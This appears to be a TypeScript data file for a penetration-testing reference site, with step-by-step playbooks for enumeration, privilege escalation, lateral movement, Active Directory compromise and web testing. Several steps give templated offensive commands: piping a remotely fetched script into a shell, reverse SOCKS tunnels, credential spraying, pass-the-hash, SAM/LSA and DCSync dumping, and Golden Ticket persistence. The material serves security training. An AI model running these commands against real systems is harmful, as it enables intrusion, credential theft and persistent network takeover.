/**
 * Methodologies: the judgment layer. Not "what is this command" (that is the
 * reference) but "what do I reach for, in what order, and why" - how an
 * experienced operator actually thinks through an engagement.
 *
 * Model: methodology -> ordered phases -> steps. A step carries the reasoning
 * (detail), the tactical moves (how operators think), the key commands
 * (variable-filled, byte-exact), and cross-links into the techniques and
 * libraries so the thinking layer and the reference layer are one product.
 *
 * Structured data: adding a playbook, phase, or step is a data entry.
 */
import type { Cmd } from './commands.ts';

export interface MethodLink { label: string; to: string } // `to` is relative to BASE_URL

export interface MethodStep {
  title: string;
  detail?: string;      // the reasoning: what you are establishing and why
  moves?: string[];     // ordered tactical moves / checks
  cmds?: Cmd[];         // the key commands for this step
  link?: MethodLink;    // cross-ref into a technique / route / library
}

export interface MethodPhase {
  id: string;
  title: string;
  goal: string;         // one-line objective of the phase
  steps: MethodStep[];
}

export interface Methodology {
  id: string;           // slug + anchor
  title: string;
  tag: string;          // the sub-domains it spans
  premise: string;      // the operator mindset for this playbook
  phases: MethodPhase[];
  principles: string[]; // the operating rules / gotchas to carry
  refs?: { label: string; url: string }[];
}

export const METHODOLOGIES: Methodology[] = [
  // ================================================================ 1
  {
    id: 'enumeration-strategy', title: 'Enumeration Strategy',
    tag: 'recon · service enumeration · prioritization',
    premise: 'Enumeration is the engagement. You rarely get stuck because a target is hard; you get stuck because you stopped enumerating. Every wall means you have not found the door yet. The operator edge is breadth first (see everything), then depth on the highest-signal thing you found. Exploitation is the short, easy part that comes after.',
    phases: [
      {
        id: 'enum-surface', title: 'Phase 1 · Map the attack surface',
        goal: 'Know every open port, the service behind it, and its version.',
        steps: [
          {
            title: 'Sweep all ports before touching any service',
            detail: 'A fast top-1000 scan is for orientation only. The way in is often a service on a high, non-standard port a fast scan never sees. Full range first, always.',
            cmds: [
              { cmd: 'nmap -p- --min-rate 5000 -T4 <TARGET-IP> -oN ports.txt', desc: 'All 65535 ports, fast, saved. Read which are open' },
              { cmd: 'nmap -sCV -p$(grep ^[0-9] ports.txt | cut -d/ -f1 | paste -sd,) <TARGET-IP> -oN services.txt', desc: 'Version + default scripts on only the open ports' },
              { cmd: 'nmap -sU --top-ports 100 <TARGET-IP>', desc: 'Do not forget UDP: SNMP, DNS, TFTP, IKE hide here' },
            ],
          },
          {
            title: 'Record every version for later',
            detail: 'Each version string is a lead. Match it against known exploits now and again whenever you get stuck. Version precision is what turns a service into a shell.',
            link: { label: 'CVE Vault', to: 'library/cves' },
          },
        ],
      },
      {
        id: 'enum-depth', title: 'Phase 2 · Enumerate each service in depth',
        goal: 'Turn each open service into a concrete foothold lead.',
        steps: [
          {
            title: 'Web (80 / 443 / 8080 / 8000 ...)',
            detail: 'Usually the largest surface. Fingerprint, then discover content, vhosts, and parameters. Read the source and robots.txt; the interesting stuff is rarely linked.',
            cmds: [
              { cmd: 'whatweb -a 3 http://<TARGET-IP> && curl -sI http://<TARGET-IP>', desc: 'Stack, framework, versions, headers' },
              { cmd: 'ffuf -u http://<TARGET-IP>/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -mc 200,301,302,403', desc: 'Directory / file discovery' },
              { cmd: 'ffuf -u http://<TARGET-IP> -H "Host: FUZZ.<TARGET-IP>" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs 0', desc: 'Virtual host discovery (new apps hide behind Host headers)' },
            ],
            link: { label: 'Web testing approach', to: 'library/methodologies#web-testing' },
          },
          {
            title: 'SMB (139 / 445)',
            detail: 'On Windows and AD networks, SMB leaks users, shares, and sometimes files with credentials. Try a null session first.',
            cmds: [
              { cmd: 'netexec smb <TARGET-IP> -u "" -p "" --shares', desc: 'Null-session share listing' },
              { cmd: 'enum4linux-ng -A <TARGET-IP>', desc: 'Users, groups, shares, policy in one pass' },
              { cmd: 'smbclient -N -L //<TARGET-IP>/ && smbclient -N //<TARGET-IP>/share', desc: 'List then browse readable shares' },
            ],
          },
          {
            title: 'Everything else (FTP, SNMP, LDAP, NFS, DNS, RPC)',
            detail: 'Each has a fast high-value check. Anonymous FTP, public SNMP strings, and no_root_squash NFS are free wins operators skip when rushing.',
            cmds: [
              { cmd: 'ftp <TARGET-IP>   # try anonymous : anonymous', desc: 'Anonymous FTP is a frequent, free foothold' },
              { cmd: 'snmpwalk -v2c -c public <TARGET-IP>', desc: 'Public SNMP leaks processes, users, and sometimes creds' },
              { cmd: 'showmount -e <TARGET-IP>', desc: 'Exported NFS shares (look for no_root_squash to escalate)' },
            ],
            link: { label: 'Service enumeration (port by port)', to: 'technique/service-enumeration-port-by-port' },
          },
        ],
      },
      {
        id: 'enum-prioritize', title: 'Phase 3 · Prioritize the leads',
        goal: 'Pick the single highest-yield path and commit to it.',
        steps: [
          {
            title: 'Rank what you found',
            detail: 'Do not attack in the order you found things. Attack in the order of probability.',
            moves: [
              'Known public exploit for an exact version → try first, it is the fastest win.',
              'Default or guessable credentials on any service → try before anything clever.',
              'Obvious misconfiguration (writable share, anonymous access, exposed .git/.env).',
              'A version that is old but has no ready exploit → note it, keep enumerating.',
            ],
          },
          {
            title: 'When stuck, you missed something. Go back',
            detail: 'Being stuck is a signal that enumeration is incomplete, not that the box is unbeatable. Widen and deepen before you assume a hard exploit.',
            moves: [
              'Re-run discovery with a larger wordlist and against every vhost you found.',
              'Check UDP and the odd high ports again.',
              'Reuse any credential you found here against every other service.',
              'Read the web app source and JS bundles line by line for endpoints and secrets.',
            ],
          },
        ],
      },
    ],
    principles: [
      'Enumerate fully before you exploit. The exploit is the easy 20%.',
      'Breadth first, then depth on the highest-signal lead.',
      'A credential found in one place almost always works in another.',
      'Stuck means incomplete enumeration. Go wider, then deeper.',
      'Document every port, version, and credential as you go.',
    ],
    refs: [
      { label: 'HackTricks: pentesting methodology', url: 'https://book.hacktricks.xyz/generic-methodologies-and-resources/pentesting-methodology' },
    ],
  },

  // ================================================================ 2
  {
    id: 'privilege-escalation', title: 'Privilege Escalation Approach',
    tag: 'linux + windows · local privesc mindset',
    premise: 'You have a shell; you want root or SYSTEM. Privesc is not luck, it is a checklist run in order of reliability. Automated scanners surface most vectors, but the wins that matter (and the exam-passing ones) come from reading their output and knowing which finding is actually exploitable. Stabilize, enumerate as the new user, then escalate by highest probability.',
    phases: [
      {
        id: 'pe-stabilize', title: 'Phase 1 · Stabilize and orient',
        goal: 'A usable shell and a clear picture of who you are.',
        steps: [
          {
            title: 'Upgrade to a real TTY',
            detail: 'A half-shell wastes time and breaks on the first interactive prompt. Fix it before you enumerate.',
            link: { label: 'Shell upgrades (Payloads)', to: 'library/payloads#listeners' },
            cmds: [
              { cmd: "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'", desc: 'Spawn a PTY, then Ctrl+Z, then: stty raw -echo; fg' },
            ],
          },
          {
            title: 'Establish your context',
            detail: 'The two commands that most often hand you the answer immediately.',
            cmds: [
              { cmd: 'id && sudo -l', desc: 'Linux: your groups, and anything you can run as root' },
              { cmd: 'whoami /priv && whoami /groups', desc: 'Windows: your privileges (SeImpersonate?) and group memberships' },
            ],
          },
          {
            title: 'Linux: are you already root-adjacent?',
            detail: 'Read your groups before reaching for any exploit. docker, lxd/lxc, and disk are root-equivalent by design, and a privileged container or an exposed Docker socket breaks straight out to the host.',
            link: { label: 'Container escapes & privileged groups', to: 'technique/container-escapes-privileged-groups' },
          },
        ],
      },
      {
        id: 'pe-enum', title: 'Phase 2 · Enumerate every vector',
        goal: 'Surface all escalation paths, automated and manual.',
        steps: [
          {
            title: 'Run the scanner, but read the output',
            detail: 'LinPEAS / WinPEAS find most vectors and highlight them. The tool is the start of the analysis, not the end. Run it in memory to avoid touching disk.',
            cmds: [
              { cmd: 'curl http://<YOUR-IP>:<LPORT>/linpeas.sh | sh', desc: 'Linux, in-memory. Read the red/yellow findings' },
              { cmd: 'iwr http://<YOUR-IP>:<LPORT>/winPEASx64.exe -o w.exe; .\\w.exe', desc: 'Windows. Focus on services, privileges, and stored creds' },
            ],
          },
          {
            title: 'Run the manual high-value checks the scanner buries',
            moves: [
              'Linux: sudo -l (check each entry on GTFOBins), SUID/SGID binaries, writable cron, capabilities.',
              'Windows: unquoted service paths, weak service permissions, AlwaysInstallElevated, scheduled tasks.',
              'Both: anything running as root/SYSTEM that you can influence (a writable script, a config, a binary).',
            ],
            cmds: [
              { cmd: 'find / -perm -4000 -type f 2>/dev/null', desc: 'Linux SUID binaries (check each on GTFOBins)' },
              { cmd: 'getcap -r / 2>/dev/null', desc: 'Linux capabilities (cap_setuid = instant root)' },
            ],
          },
          {
            title: 'Hunt credentials',
            detail: 'A found password beats every exploit: it is reliable, quiet, and often reused for the next box too.',
            cmds: [
              { cmd: "grep -riE 'password|passwd|secret|api_key' /etc /var/www /home 2>/dev/null", desc: 'Linux: creds in configs, web roots, home dirs' },
              { cmd: 'reg query HKLM /f password /t REG_SZ /s 2>nul', desc: 'Windows: passwords in the registry' },
            ],
            link: { label: 'LSASS Dumping (Offline)', to: 'technique/lsass-dumping-offline' },
          },
        ],
      },
      {
        id: 'pe-escalate', title: 'Phase 3 · Escalate by reliability',
        goal: 'Root or SYSTEM via the highest-probability vector first.',
        steps: [
          {
            title: 'Linux: work down the reliability order',
            moves: [
              'sudo rights → GTFOBins (most reliable).',
              'SUID binary → GTFOBins.',
              'Writable cron, systemd timer, or service.',
              'Capabilities (cap_setuid).',
              'One-shot userspace roots (PwnKit, Baron Samedit) before you risk the kernel.',
              'Kernel exploit last: it can panic the box.',
            ],
            link: { label: 'Linux escalation priorities', to: 'technique/escalation-priority-order' },
          },
          {
            title: 'Linux: try the one-shot roots first',
            detail: 'PwnKit (pkexec) and Baron Samedit (sudo) are near-universal userspace bugs that give a root shell with no special rights and no panic risk. Try them before a kernel exploit.',
            link: { label: 'One-Shot Local Root', to: 'technique/one-shot-local-root-pwnkit-baron-samedit' },
          },
          {
            title: 'Linux: sudo env and wildcard injection',
            detail: 'If sudo -l keeps LD_PRELOAD / LD_LIBRARY_PATH, force root to load your shared object. If a root job globs a directory you can write, plant filenames it reads as flags (tar --checkpoint).',
            link: { label: 'LD_PRELOAD & Wildcard Injection', to: 'technique/ldpreload-ldlibrarypath-wildcard-injection' },
          },
          {
            title: 'Linux: writable systemd units',
            detail: 'systemd has largely replaced cron. A writable .service/.timer, or a root unit whose ExecStart target you can edit, is a clean path to root.',
            link: { label: 'Writable systemd Services & Timers', to: 'technique/writable-systemd-services-timers' },
          },
          {
            title: 'Windows: work down the reliability order',
            moves: [
              'SeImpersonate / SeAssignPrimaryToken → a Potato attack to SYSTEM.',
              'Unquoted service path with a writable folder.',
              'Weak service permissions → reconfigure the binary path.',
              'AlwaysInstallElevated → a malicious MSI.',
              'Stored credentials (cmdkey, registry, SAM).',
            ],
            link: { label: 'Windows escalation priorities', to: 'technique/priority-order-table' },
          },
          {
            title: 'Local admin but no rights? Bypass UAC',
            detail: 'In Administrators but at medium integrity, UAC stands between you and real admin. Auto-elevating-binary tricks (fodhelper) cross to high integrity with no prompt.',
            link: { label: 'UAC Bypass', to: 'technique/uac-bypass' },
          },
        ],
      },
    ],
    principles: [
      'Stabilize the shell before you do anything else.',
      'The scanner finds it; you have to read it. Do not run and pray.',
      'Escalate in order of reliability, not in the order you found things.',
      'A found credential beats an exploit every time.',
      'Kernel exploits are the last resort. They crash boxes.',
    ],
    refs: [
      { label: 'GTFOBins', url: 'https://gtfobins.github.io/' },
      { label: 'LOLBAS (Windows)', url: 'https://lolbas-project.github.io/' },
    ],
  },

  // ================================================================ 3
  {
    id: 'lateral-movement', title: 'Lateral Movement and Pivoting',
    tag: 'credential reuse · pivoting · tunneling',
    premise: 'One box is a foothold, not the goal. Lateral movement is the multiplier: every credential you loot is a key that usually opens more than one door, and every host you own is a new vantage point into networks you could not reach before. Loot, reuse relentlessly, pivot to see the internal network, and move toward the assets that actually matter.',
    phases: [
      {
        id: 'lm-loot', title: 'Phase 1 · Loot the current host',
        goal: 'Extract every credential and map what this host can reach.',
        steps: [
          {
            title: 'Dump credentials, hashes, and tickets',
            detail: 'Before you leave a host, take everything reusable from it.',
            cmds: [
              { cmd: 'netexec smb <TARGET-IP> -u <USER> -p <PASS> --sam --lsa', desc: 'Windows: dump local SAM hashes and LSA secrets' },
              { cmd: 'find / \\( -name "id_rsa" -o -name "*.kdbx" -o -name "*.ovpn" \\) 2>/dev/null', desc: 'Linux: SSH keys, KeePass DBs, VPN configs' },
            ],
            link: { label: 'Mimikatz', to: 'technique/mimikatz' },
          },
          {
            title: 'Map what this host can reach',
            detail: 'A compromised host sees networks and services the outside cannot. Enumerate from the inside.',
            cmds: [
              { cmd: 'arp -a; ip neigh; cat /etc/hosts', desc: 'Neighbours and hard-coded internal hosts' },
              { cmd: 'ss -tlnp || netstat -antp', desc: 'Internal services bound to loopback (privesc + pivot leads)' },
            ],
          },
        ],
      },
      {
        id: 'lm-reuse', title: 'Phase 2 · Reuse credentials everywhere',
        goal: 'Turn one credential into many hosts.',
        steps: [
          {
            title: 'Spray the credential across the subnet',
            detail: 'Password reuse is the rule, not the exception. One valid pair often authenticates to a dozen machines.',
            cmds: [
              { cmd: 'netexec smb <RANGE> -u <USER> -p <PASS>', desc: 'Spray a cred across the subnet (Pwned! = local admin)' },
              { cmd: 'netexec winrm <RANGE> -u <USER> -p <PASS>', desc: 'Where it lands, check WinRM for an interactive shell' },
            ],
          },
          {
            title: 'Pass the hash / ticket when you have no cleartext',
            detail: 'You rarely need to crack. The hash or ticket authenticates directly.',
            cmds: [
              { cmd: 'netexec smb <RANGE> -u <USER> -H <NTLM-HASH>', desc: 'Pass-the-hash spray with an NT hash' },
              { cmd: 'evil-winrm -i <TARGET-IP> -u <USER> -H <NTLM-HASH>', desc: 'Interactive PtH shell over WinRM' },
            ],
          },
        ],
      },
      {
        id: 'lm-pivot', title: 'Phase 3 · Pivot into unreachable networks',
        goal: 'Route your tools through the foothold into internal subnets.',
        steps: [
          {
            title: 'Stand up a SOCKS proxy through the foothold',
            detail: 'A tunnel turns your whole toolkit onto the internal network. Set it up once, then run everything through it.',
            cmds: [
              { cmd: './chisel server -p <LPORT> --reverse   # attacker', desc: 'Start the chisel server on your box' },
              { cmd: './chisel client <YOUR-IP>:<LPORT> R:socks   # victim', desc: 'Victim connects back, opens a SOCKS proxy on your side' },
              { cmd: 'proxychains -q nmap -sT -Pn <internal-host>', desc: 'Run any tool through the tunnel with proxychains' },
            ],
            link: { label: 'Pivoting & Tunneling', to: 'technique/pivoting-tunneling' },
          },
          {
            title: 'Forward a single internal service when a full proxy is overkill',
            cmds: [
              { cmd: 'ssh -L 8080:127.0.0.1:8080 <USER>@<TARGET-IP>', desc: 'Bring one internal port to your localhost' },
            ],
          },
        ],
      },
    ],
    principles: [
      'The foothold is a pivot, not the destination.',
      'Reuse every credential against every host. Reuse is the norm.',
      'You rarely need to crack a hash: pass it.',
      'Tunnel first, then scan the internal network through the tunnel.',
      'Move toward the crown jewels: the DC, the database, the backups.',
    ],
    refs: [
      { label: 'Ligolo-ng', url: 'https://github.com/nicocha30/ligolo-ng' },
      { label: 'HackTricks: pivoting / tunneling', url: 'https://book.hacktricks.xyz/generic-methodologies-and-resources/tunneling-and-port-forwarding' },
    ],
  },

  // ================================================================ 4
  {
    id: 'active-directory', title: 'Active Directory Attack Path',
    tag: 'domain recon · kerberos · ACLs · domain dominance',
    premise: 'Active Directory is a graph of who can act on whom, and almost every real environment hides a path from a low-privilege user to Domain Admin somewhere in that graph. The methodology: get any domain foothold, map the graph, take the cheap wins, walk the path to a DA-equivalent, then dominate and persist. BloodHound is what turns "I am stuck" into "here is the shortest path."',
    phases: [
      {
        id: 'ad-recon', title: 'Phase 1 · Domain recon',
        goal: 'Map the terrain and the privilege graph.',
        steps: [
          {
            title: 'Enumerate the domain',
            detail: 'Users, groups, computers, and policy. Even one valid credential opens most of this up.',
            cmds: [
              { cmd: 'netexec smb <DC-IP> -u <USER> -p <PASS> --users --groups', desc: 'Domain users and groups over SMB' },
              { cmd: 'ldapdomaindump -u <DOMAIN>\\\\<USER> -p <PASS> <DC-IP>', desc: 'Full LDAP dump to browsable HTML' },
            ],
            link: { label: 'Service enum: LDAP, Kerberos, RPC', to: 'technique/service-enumeration-port-by-port' },
          },
          {
            title: 'Collect BloodHound data and find the path',
            detail: 'This is the single highest-leverage move in AD. Let the graph show you the shortest path to Domain Admin instead of guessing.',
            cmds: [
              { cmd: 'bloodhound-python -u <USER> -p <PASS> -d <DOMAIN> -ns <DC-IP> -c all', desc: 'Collect from Linux, then import the zips into BloodHound' },
            ],
            link: { label: 'Route: low-priv creds → next moves', to: 'route/low-priv-creds' },
          },
        ],
      },
      {
        id: 'ad-creds', title: 'Phase 2 · Get and escalate credentials',
        goal: 'From no creds, or a weak user, toward a privileged account.',
        steps: [
          {
            title: 'Poison the network for a first hash',
            detail: 'No account at all? On an internal segment, Responder (LLMNR/NBT-NS) or mitm6 (IPv6 DNS) makes machines authenticate to you within minutes. Crack the NetNTLM hash, or relay it live.',
            link: { label: 'Network Poisoning & MITM', to: 'technique/network-poisoning-mitm' },
          },
          {
            title: 'No credentials yet',
            detail: 'You can often get a first hash without any account at all.',
            cmds: [
              { cmd: 'netexec ldap <DC-IP> -u users.txt -p "" --asreproast asrep.txt', desc: 'AS-REP roast accounts with no Kerberos pre-auth' },
              { cmd: 'sudo responder -I tun0', desc: 'Poison LLMNR/NBT-NS to capture NetNTLM hashes' },
            ],
            link: { label: 'NTLM Relay & Coercion', to: 'technique/ntlm-relay-coercion' },
          },
          {
            title: 'Have a user? Take the cheap wins',
            detail: 'Kerberoast first: service accounts often have weak, crackable passwords and elevated rights.',
            cmds: [
              { cmd: 'netexec ldap <DC-IP> -u <USER> -p <PASS> --kerberoasting kerb.txt', desc: 'Request service tickets for offline cracking' },
              { cmd: 'hashcat -m 13100 kerb.txt /usr/share/wordlists/rockyou.txt', desc: 'Crack the TGS-REP hashes' },
            ],
            link: { label: 'Kerberoasting', to: 'technique/kerberoasting' },
          },
          {
            title: 'Walk the ACL / delegation path BloodHound found',
            detail: 'The path to DA is usually a chain of small rights: GenericWrite, WriteDACL, delegation. Follow the graph edge by edge.',
            link: { label: 'Delegation Abuse', to: 'technique/delegation-abuse-constrained-rbcd' },
          },
          {
            title: 'Check AD CS - the modern shortcut to DA',
            detail: 'Certificate Services is the most common fast path today: a misconfigured template (ESC1) or an NTLM relay to the CA (ESC8) hands you a Domain Admin certificate. Run certipy find early.',
            link: { label: 'AD CS Abuse (ESC1)', to: 'technique/ad-cs-abuse-esc1' },
          },
        ],
      },
      {
        id: 'ad-dominance', title: 'Phase 3 · Domain dominance',
        goal: 'DA-equivalent → full control and persistence.',
        steps: [
          {
            title: 'DCSync the hashes',
            detail: 'With replication rights (Domain Admin, or delegated), pull every hash in the domain, including krbtgt.',
            cmds: [
              { cmd: 'impacket-secretsdump <DOMAIN>/<USER>:<PASS>@<DC-IP> -just-dc', desc: 'DCSync all domain hashes' },
            ],
            link: { label: 'DCSync (route)', to: 'technique/dcsync' },
          },
          {
            title: 'Persist',
            detail: 'The krbtgt hash is the master key. A Golden Ticket forges access to anything, as anyone, indefinitely.',
            moves: [
              'Golden Ticket from the krbtgt hash for domain-wide, long-term access.',
              'Dump LAPS / GMSA passwords for local admin everywhere.',
              'Record what you touched and clean up artifacts.',
            ],
          },
        ],
      },
    ],
    principles: [
      'When stuck, run BloodHound. The path is almost always already there.',
      'Take cheap wins (AS-REP, Kerberoast, spray) before ACL chains.',
      'You rarely crack: pass the hash or the ticket.',
      'krbtgt is the keys to the kingdom. Protect the loot, clean the artifacts.',
      'Every step should move you along a path the graph shows, not a guess.',
    ],
    refs: [
      { label: 'The Hacker Recipes: AD', url: 'https://www.thehacker.recipes/a-d/movement' },
      { label: 'BloodHound docs', url: 'https://bloodhound.readthedocs.io/' },
    ],
  },

  // ================================================================ 5
  {
    id: 'web-testing', title: 'Web Application Testing',
    tag: 'mapping · input testing · exploitation chains',
    premise: 'A web application is a set of inputs and a set of trust assumptions. Testing is systematically violating each assumption. Map everything the app does and every input it takes, hit each input with each injection class, then chain what you find. The bug is almost always in the input the developer forgot to distrust, including the headers and cookies.',
    phases: [
      {
        id: 'web-map', title: 'Phase 1 · Map the application',
        goal: 'Know every page, parameter, technology, and trust boundary.',
        steps: [
          {
            title: 'Fingerprint the stack',
            cmds: [
              { cmd: 'whatweb -a 3 http://<TARGET-IP> && curl -sI http://<TARGET-IP>', desc: 'Framework, server, CMS, and security headers' },
            ],
          },
          {
            title: 'Discover content and parameters',
            detail: 'The vulnerable endpoint is rarely in the navigation. Brute directories, vhosts, and params; let Burp spider while you click.',
            cmds: [
              { cmd: 'ffuf -u http://<TARGET-IP>/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -mc all -fc 404', desc: 'Directory and file discovery' },
              { cmd: 'ffuf -u "http://<TARGET-IP>/api?FUZZ=1" -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -fs 0', desc: 'Hidden parameter discovery' },
            ],
          },
          {
            title: 'Map authentication, roles, and trust boundaries',
            detail: 'Note where privilege changes: login, admin areas, anything that fetches a URL, anything that takes a file. Those boundaries are where the bugs live.',
          },
        ],
      },
      {
        id: 'web-test', title: 'Phase 2 · Test each input class',
        goal: 'Find the vulnerability by violating one assumption at a time.',
        steps: [
          {
            title: 'Injection (SQLi, command, XSS, SSTI)',
            detail: 'Send one metacharacter at a time into every input and watch for errors, reflections, or timing shifts.',
            link: { label: 'OWASP A03 Injection', to: 'library/owasp#injection' },
          },
          {
            title: 'Access control (IDOR, forced browsing)',
            detail: 'Change every id and role you control; hit privileged paths directly. The most common critical finding, and a scanner will miss it.',
            link: { label: 'OWASP A01 Broken Access Control', to: 'library/owasp#broken-access-control' },
          },
          {
            title: 'The rest (SSRF, XXE, upload, auth, deserialization)',
            detail: 'Any feature that fetches a URL, parses XML, accepts a file, or handles sessions is a category to test in full.',
            link: { label: 'OWASP Top 10 (all categories)', to: 'library/owasp' },
          },
        ],
      },
      {
        id: 'web-exploit', title: 'Phase 3 · Exploit and chain',
        goal: 'Turn a finding into real impact.',
        steps: [
          {
            title: 'Escalate the single bug',
            detail: 'A finding is a foothold. Push it to its maximum: SQLi to RCE, LFI to RCE via log poisoning, stored XSS to account takeover.',
          },
          {
            title: 'Chain low-severity findings into high',
            detail: 'Two "medium" bugs often combine into a critical: an open redirect feeds an SSRF, an IDOR leaks the token that breaks auth. Report the chain, not just the parts.',
            moves: [
              'Keep every request/response in Burp: it is your notebook and your proof.',
              'Retest after any "fix": patches are often incomplete or bypassable.',
            ],
          },
        ],
      },
    ],
    principles: [
      'Map the whole app before you test a single input.',
      'Test every input class against every input, headers and cookies included.',
      'Burp is your notebook: capture everything, it becomes the proof.',
      'One bug is a foothold. Chain findings for real impact.',
      'Retest fixes: incomplete patches are their own finding.',
    ],
    refs: [
      { label: 'OWASP Web Security Testing Guide', url: 'https://owasp.org/www-project-web-security-testing-guide/' },
      { label: 'PortSwigger Web Security Academy', url: 'https://portswigger.net/web-security' },
    ],
  },
];
